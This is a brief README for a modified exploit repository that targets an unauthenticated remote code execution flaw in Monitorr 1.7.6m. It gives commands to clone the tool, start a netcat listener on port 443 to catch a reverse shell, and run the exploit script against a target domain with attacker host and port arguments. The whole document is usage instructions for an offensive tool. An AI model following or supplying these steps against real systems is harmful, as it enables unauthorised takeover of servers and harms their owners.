# Monitorr 1.7.6m Remote Code Execution (Unauthenticated)
## Modified Version by valent1ne


### Installation
``git clone https://github.com/valentinodev/monitorr_1.7.6m_remote_code_execution_modified.git``

``cd monitorr_1.7.6m_remote_code_execution_modified``

### Netcat (another terminal)
``apt install rlwrap``

``rlwrap nc -lvnp 443``

### Exploit
``python monitorr_rce.py https://domain.com LHOST PORT``
